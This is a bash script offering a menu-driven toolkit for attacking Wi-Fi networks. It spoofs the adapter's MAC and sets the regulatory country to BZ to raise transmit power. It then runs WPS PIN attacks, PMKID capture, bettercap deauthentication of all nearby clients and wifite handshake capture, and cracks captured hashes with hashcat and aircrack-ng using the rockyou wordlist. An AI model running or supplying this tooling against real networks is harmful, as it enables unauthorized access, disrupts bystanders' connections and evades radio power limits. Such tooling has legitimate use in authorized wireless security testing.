#!/bin/bash


###############################################################################################################
# Gobal variabes
red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
blue=`tput setaf 4`
magenta=`tput setaf 5`
cyan=`tput setaf 6`
white=`tput setaf 7`
reset=`tput sgr0`

DEFAULT_IFACE="wlan1"
IFACE=$1
DELAY=2
DEFAULT_SEARCH_TIME=30
SEARCH_TIME=30

# Set file variables
WORDLIST="/usr/share/wordlists/rockyou.txt"
FILE_HS="./captures/handshakes_hcxdumptool.pcapng"
FILE_HASH="./captures/pkmid_HC.16800"
CAPLET="./wpa_captures.cap"
BETTERCAP_PCAP="./captures/bettercap.pcap"

###############################################################################################################
#Functions

# Command success
Command_success () {

        if [ $1 -eq 0 ]; then
        echo "...$green PASS! $reset"
        else
        echo "...$red FAIL! $reset"
        fi
}

Set_adaptor_down (){
	echo "$yellow[C]$reset Command: ip link set $IFACE down"
	echo -n "$green[+] $reset Setting $IFACE down..."
	ip link set $IFACE down
	Command_success $?
}

Set_adaptor_up (){
	echo "$yellow[C]$reset Command: ip link set $IFACE up"
	echo -n "$green[+] $reset Setting $IFACE up..."
	ip link set $IFACE up
	Command_success $?
}

Set_adaptor_country (){
	echo "$yellow[C]$reset Command: iw reg set BZ"
	echo -n "$green[+] $reset Setting adaptor country..."
	iw reg set BZ
	Command_success $?
}

Set_adaptor_power (){
	echo "$yellow[C]$reset Command: iw dev $IFACE set txpower fixed 30mBm"
	echo -n "$green[+] $reset Setting $IFACE power..."
	iw dev $IFACE set txpower fixed 30mBm # > /dev/null 2>&1
	#iwconfig wlan0 txpower 30
	sleep 3
	Command_success $?
}

Change_adaptor_MAC (){
	echo "$yellow[C]$reset Command: macchanger -r $IFACE"
	echo -n "$green[+] $reset Changing MAC address for $IFACE..."
	macchanger -r $IFACE > /dev/null 2>&1
	Command_success $?
}

Adaptor_monitor_mode (){
	echo "$yellow[C]$reset Command: iw $IFACE set monitor control"
	echo -n "$green[+] $reset Setting $IFACE into monitor mode..."
	iw $IFACE set monitor control
	sleep 3 
	Command_success $?
}


Adaptor_managed_mode (){
	echo -n "$green[+] $reset Setting $IFACE into managed mode..."
	iwconfig $IFACE mode managed
	sleep 2
	Command_success $?
}

Change_adaptor (){
	adaptors=$(ip link | awk -F: '$0 !~ "lo|vir|eth|^[^0-9]"{print $2}')
	select interface in ${adaptors[@]}
	do
		echo "You have chosen $interface"
		IFACE=$interface
		return
	done
}

Update_nmcli (){
	echo "$yellow[C]$reset Command: nmcli d set $IFACE managed $1"
	echo -n "[+] Turning off NetworkManager for $IFACE..."
	# $1 is either on or off
	nmcli d set $IFACE managed $1
	Command_success $?
}


Delete_file (){
        # if file exist remove
        if [ -f $1 ]; then
                echo -n "$red[+]$reset Deleting existing file$1"
                rm $1
                Command_success $?
        fi
}

Create_capture_folder (){
        # if folder does not exist make
        if [ ! -d "captures" ]; then
      		echo -n "$green[+]$reset Creating 'captures' folder"
                mkdir captures
                Command_success $?
        fi
}

Get_search_time (){
	read -p "Enter the search time in seconds [default=300] >> " time
	if [ $time="" ] ; then
		SEARCH_TIME=$DEFAULT_SEARCH_TIME
	else
		SEARCHTIME= $time
	fi
	echo "$green[+] $reset Search time set to $SEARCH_TIME"
	sleep 2
}


###############################################################################################################
# Submenu Setup
submenu_setup () {

while true
do

	echo "$green[+]$reset Interface selected: $magenta$IFACE$reset"
	echo ""
	echo "1) Full Setup"
	echo "2) Increase Adaptor Power"
	echo "3) Change Adaptors MAC" 
	echo "4) Change Adaptor To  Monitor"
	echo "5) Change Adaptor To Manage"
	echo "6) Select Adaptor"
	echo "b) Back"
	echo "q) Quit"
	echo -n ">> "
	read opt
	case $opt in
		1)
			echo ""
			echo "$blue Setting up adaptor for snooping $reset"
			Set_adaptor_down
			Set_adaptor_country
			Set_adaptor_power
			Change_adaptor_MAC
			Adaptor_monitor_mode
			Set_adaptor_up
			Update_nmcli no
			echo ""
			;;
		2)
			echo ""
			echo "$blue Increasing adaptor's power $reset"
			Set_adaptor_down
			Set_adaptor_country
			Set_adaptor_power
			Set_adaptor_up
			echo ""
			;;
          	3)
			echo ""
			echo "$blue Changing adaptors MAC address $reset"
			Set_adaptor_down
			Change_adaptor_MAC
			Set_adaptor_up
			echo ""
              		;;
		4)
                        echo ""
			echo "$blue Changing adaptor into monitor mode $reset"
			Set_adaptor_down
			Adaptor_monitor_mode
			Set_adaptor_up
			Update_nmcli no
			echo ""
			;;
		5)
			echo ""
			echo "$blue Changing adaptor into managed mode $reset"
			Set_adaptor_down
			Adaptor_managed_mode
			Set_adaptor_up
			echo ""
			;;
		6)
			echo ""
			echo "$blue Select adpator to work with $reset"
			Change_adaptor
			echo ""
			;;
        
		b)
        	return
        	;;
		
		q)
			exit
			;;
        
		*)
			echo "$red[-]$reset Invalid option $REPLY"
			;;
      	
	esac

done
}

###############################################################################################################
# Submenu Attack
submenu_attack () {

while true
do


	echo "$green[+]$reset Interface selected: $magenta$IFACE$reset"
	echo ""
	echo "1) WPS Attack (Oneshot)"
	echo "2) PMKID Attack"
	echo "3) WPA Attack (Wifite)"
	echo "4) WPA Attach (Bettercap)"
	echo "5) WPS Attack (Wifite)"
	echo "b) Back"
	echo "q) Quit"
	echo -n ">> "
	read opt
	case $opt in
		1)
			echo ""
			echo "$blue WPS Attack $reset"
			echo "$yellow[C]$reset Command: python3 oneshot.py -i $IFACE"
			Set_adaptor_down
			Adaptor_managed_mode
			Set_adaptor_up
			python3 oneshot.py -i $IFACE
			Set_adaptor_down
			Adaptor_monitor_mode
			Set_adaptor_up
			echo ""
			;;
		2)
			echo ""
			echo "$blue PMKID Attack $reset"
			Get_search_time
			# if handshake file exist remove
			Delete_file $FILE_HS
			Delete_file $FILE_HASH
			# Search for PMKIDs
			timeout $SEARCH_TIME hcxdumptool -i $IFACE -o "$FILE_HS" --enable_status=1 
			sleep 2

			# convert file
			echo "$yellow[C]$reset Command: hcxpcaptool -z $FILE_HASH $FILE_HS | awk '/PMKID(s)/{print$NF}'"
			echo "$green[+]$reset Converting pmkid handshakes to hashcat format..."
			pmkid_found=$(hcxpcaptool -z $FILE_HASH $FILE_HS | awk '/PMKID(s)/{print$NF}')
			Command_success $?
			now=$(date +"%m_%d_%Y")
			new_fileName="pmkid_handshake_$now.pcapng"
			cp $FILE_HS ./captures/$new_fileName

			if [ $pmkid_found -gt 0 ] ; then
        			echo "$green[+]$reset PMKIDs found $pmkid_found"
			else
        			echo "$red[-]$reset No PMKIDs found...Try again later!"
        			return
			fi

			read -p "$blue[?] $reset Do you want to try and crack the hash? [Y/N]" crack
			if [ $crack="Y" ] | [ $crack="y" ]; then
				echo "$yellow[C]$reset Command: hashcat -m 16800 $FILE_HASH $WORDLIST | tee -a ./cracked.log | sort ./cracked.log | uniq -u"
				echo "$green[+]$reset Cracking password..."
        		hashcat -m 16800 $FILE_HASH $WORDLIST | tee -a ./cracked.log | sort ./cracked.log | uniq -u
			fi
			echo ""
			;;
        
		3)
			echo ""
			echo "$blue WPA Attack (Wifite) $reset"
			Get_search_time
			echo "$yellow[C]$reset Command: wifite -i $IFACE -mac --skip-crack -pow 36 -p $SEARCH_TIME --wpa --no-pmkid"
			wifite -i $IFACE -mac --skip-crack -pow 36 -p $SEARCH_TIME --wpa --no-pmkid
			echo ""
			;;

		4)
			echo ""
			echo "$blue WPA Attack (Bettercap) $reset"
			#mode=("Agressive" "Stealth [default]")
			select opt in "Agressive" "Stealth" 
			#echo "You have chosen $opt"
			do
			if [ "$opt" = "Agressive" ]; then	
				echo "$yellow[C]$reset Command: bettercap -iface $IFACE -eval \"set ticker.period 20; set ticker.commands 'clear; wifi.show;wifi.assoc all; sleep 7; wifi.deauth all'; set wifi.handshakes.file $BETTERCAP_PCAP; wifi.recon on; sleep 5; ticker on; clear\""
				bettercap -iface $IFACE -eval "set ticker.period 20; set ticker.commands 'clear; wifi.show;wifi.assoc all; sleep 7; wifi.deauth all'; set wifi.handshakes.file $BETTERCAP_PCAP; wifi.recon on; sleep 5; ticker on; clear"
			else	
				echo "$yellow[C]$reset Command: bettercap -iface $IFACE -eval \"set ticker.period 20; set ticker.commands 'clear; wifi.show;wifi.assoc all; sleep 7'; set wifi.handshakes.file $BETTERCAP_PCAP; wifi.recon on; sleep 5; ticker on; clear\""
				bettercap -iface $IFACE -eval "set ticker.period 20; set ticker.commands 'clear; wifi.show;wifi.assoc all; sleep 7'; set wifi.handshakes.file $BETTERCAP_PCAP; wifi.recon on; sleep 5; ticker on; clear" 
			fi
			return
			done
			;;

		5)
			echo ""
			echo "$blue WPS Attack (Wifite) $reset"
			echo "$yellow[C]$reset Command: wifite -i $IFACE --wps-only -mac --skip-crack -pow 36 -p $SEARCH_TIME"
			wifite -i $IFACE --wps-only -mac --skip-crack -pow 36 -p $SEARCH_TIME
			;;
		
		b)
                        echo ""
			return
			echo ""
			;;
		q)
              		exit
              		;;
          	*) 
			echo "$red[-]$reset Invalid option $REPLY"
			;;
      	esac
done
}

###############################################################################################################
# Submenu Crack
submenu_crack () {

while true
do


	echo "$green[+]$reset Interface selected: $magenta$IFACE$reset"
	echo ""
	echo "1) Crack (aircrack-ng)"
	echo "2) Crack (Wifite)"
	echo "3) Crack WPA (Hashcat)"
	echo "4) Crack PMKID (Hashcat)"
	echo "b) Back"
	echo "q) Quit"
	echo -n ">> "
	read opt
	case $opt in
		1)
			echo ""
			echo "$blue Crack (aircrack-ng) $reset"
			echo ""
			# Get list of files in ./captures
				files="$(ls -l ./captures | awk '$5 > 0 {print $9}')"
				select capture in ${files[@]}
				do
				echo "You have chosen $capture"
				echo "$yellow[C]$reset Command: aircrack-ng ./captures/$capture -w $WORDLIST -l ./captures/temp.txt"
				output_file="./captures/cracked_aircrack.txt"
				aircrack-ng ./captures/$capture -w $WORDLIST -l ./captures/temp.txt 
				echo ./captures/temp.txt >> $output_file | sort | uniq -u
				
				if [ -f ./catures/temp.txt ] ; then
					rm ./captures/temp.txt
				fi
				return
				done
			
			echo ""
			;;
		2)
			echo ""
			echo "$blue Crack (Wifite) $reset"
			echo "$yellow[C]$reset Command: wifite --crack --dict $WORDLIST"
			wifite --crack --dict $WORDLIST
			echo ""
			;;
          	
		3)
			echo ""
			echo "$blue Crack WPA (Hashcat) $reset"
			
			############CHECK HASH FILE NAME
			# Convert file pcap file into hashcat format
			# Run hashcat


			#echo "$yellow[C]$reset hashcat -m 2500 -a3 $FILE_HASH $mask | tee -a $output_file | sort | uniq -u"
			#output_file="./captures/cracked_hashcat_WPA.txt"
			#read -p "Enter password mask ('?u?d?l?l?l?l?l?d') or leave blank for default wordlist>> " mask
			#if [ $mask = "" ] ; then
			#	mask="-w $WORDLIST"
			#fi
			#hashcat -m 2500 -a3 $FILE_HASH $mask | tee -a $output_file | sort | uniq -u 
			#echo ""
            ;;

		4)
			echo ""
			echo "$blue Crack PMKID (Hashcat) $reset"
			output_file="./captures/cracked_hashcat_PMKID.txt"
			
			read -p "Enter password mask ('?u?d?l?l?l?l?l?d') or leave blank for default wordlist>> " mask
			if [ $mask = "" ] ; then
				mask="-w $WORDLIST"
			fi
			echo "$yellow[C]$reset hashcat -m 16800 $FILE_HASH $mask | tee -a $output_file | sort | uniq -u"
			hashcat -m 16800 $FILE_HASH $mask | tee -a $output_file | sort | uniq -u 


    		#./hashcat-cli64.bin hashes.txt -m 100 -a 3 ?l?l?l?l?l?l?l
    		#try to crack hashes in hashes.txt that are hashed with SHA1 (-m 100) using the brute-force/mask mode (-a 3) of Hashcat, trying all 7-character strings of only lowercase letters
    		#./hashcat-cli64.bin hashes.txt -m 100 -a 0 rockyou_uniq.txt
    		#try to crack hashes in hashes.txt that are hashed with SHA1 (-m 100) using the wordlist mode (-a 0) of Hashcat, drawing its guesses from the RockYou leaked set
    		#./hashcat-cli64.bin hashes.txt -m 100 -a 0 -r ./rules/best64.rule rockyou_uniq.txt
    		#try to crack hashes in hashes.txt that are hashed with SHA1 (-m 100) using the wordlist mode (-a 0) of Hashcat, drawing its guesses from the RockYou leaked set...and also mangling those entries with the Best64 mangling rules
			echo ""
			;;

		b)
            echo ""
			return
			echo ""
			;;
		q)
			exit
            ;;
        *) 
			echo "$red[-]$reset Invalid option $REPLY"
			;;
      	esac
done
}



###############################################################################################################
# Main menu

if [ $1="" ] ;then
	IFACE=$DEFAULT_IFACE
fi

clear

while true
do

 
	echo "$green[+]$reset Interface selected: $magenta$IFACE$reset"
	echo ""
	echo "1) Setup Wifi Adaptor"
	echo "2) Manage Wifi Connections"
	echo "3) Attack Wifi"
	echo "4) Crack Wifi"
	echo "q) Quit"
	echo -n ">> "
	read opt
	clear
	case $opt in
        	1)
            		submenu_setup
            		;;
        	2)
            		python3 easywifi.py -i $IFACE
            		;;
		3)
			Update_nmcli no
			submenu_attack
			Update_nmcli yes
			;;
		4)
			submenu_crack
			;;
        	q)
            		exit
            		;;
        	*)
			echo "$red[-]$reset Invalid option!"
			;;
    	esac

done
